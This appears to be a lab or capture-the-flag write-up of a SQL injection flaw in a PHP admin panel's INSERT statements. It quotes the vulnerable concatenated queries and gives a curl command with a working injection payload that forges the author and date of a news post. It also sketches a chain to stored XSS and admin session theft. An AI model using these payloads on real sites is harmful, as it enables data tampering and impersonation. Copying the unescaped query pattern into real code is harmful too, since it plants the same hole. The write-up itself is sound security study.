# 07 — SQL injection in panel INSERTs (data tampering)

- **OWASP Top 10 (2021):** A03:2021 – Injection
- **Severity:** Medium
- **Difficulty:** Medium

## Where

- `web/panel/news_new.php:10` — `POST /panel/news_new.php` (admin):

  ```php
  mysqli_query($db, 'INSERT INTO news (title, body, author_id, created_at)
    VALUES (\'' . $title . '\', \'' . $body . '\', ' . (int)$me['id'] . ', \'' . date('Y-m-d H:i:s') . '\'')');
  ```

- `web/panel/notes.php:32` — `POST /panel/notes.php` (any logged-in user):

  ```php
  mysqli_query($db, 'INSERT INTO notes (title, body, created_at)
    VALUES (\'' . $title . '\', \'' . $body . '\', \'' . date('Y-m-d H:i:s') . '\'')');
  ```

## How it works (root cause)

User-controlled `title` and `body` are concatenated into `INSERT` statements
without escaping. Breaking out of the string literal lets the attacker
control which column values are written — **data tampering** — and, in the
news case, the `author_id` is *not* what the page claims it is.

## Exploitation steps

1. **Author spoofing on the news page** (the `author_id` position is
   reachable by closing the `body` string and supplying the remaining
   columns):

   ```bash
   curl -s -b /tmp/admin.jar \
     --data-urlencode "title=x', 'y', 2, '2026-01-01 00:00:00') -- " \
     --data-urlencode "body=zzz" \
     http://localhost:8080/panel/news_new.php
   ```

   (The `)` closes the `VALUES (...)` tuple; `-- ` comments the rest.)

2. Verify the tampered row:

   ```bash
   LD_LIBRARY_PATH=runtime/mysql/extra-libs \
     runtime/mysql/root/bin/mysql -uroot -h127.0.0.1 -P3307 osede_db \
     -e "SELECT id, title, body, author_id, created_at FROM news ORDER BY id DESC LIMIT 1;"
   ```

3. The same breakout works on `notes.php` (title/body) to write arbitrary
   note content, and on `messages.php` (see 06).

## Working PoC (verified)

```
title = x', 'y', 2, '2026-01-01 00:00:00') --
body  = zzz
```

Database result:

```
id=10  title='x'  body='y'  author_id=2  created_at='2026-01-01 00:00:00'
```

`author_id=2` was forced by the payload (not the logged-in user's id), and
`created_at` was attacker-controlled.

## Expected result / verification

- The new `news` row has attacker-chosen `title`, `body`, `author_id` and
  `created_at` — none of which match the actual poster.
- The row renders on the front page (`/index.php`) and in the news detail,
  so the tampered content is publicly visible (and, combined with 01, can
  carry stored XSS).

## Attack chain

```
panel INSERT tampering
  → publish news "as" another author (impersonation / integrity loss)
  → backdate or mis-date content
  → combine with 01: the attacker-controlled title/body is rendered
    unescaped on /index.php and /news.php → stored XSS for every visitor
    (and for the adminvisit bot → admin session theft)
```

## Notes

- Because `author_id` is cast with `(int)` *only in the non-injected
  position*, the injection lands on the raw concatenation path and the cast
  is bypassed entirely.
- The same unescaped pattern appears in `web/panel/messages.php` (06).
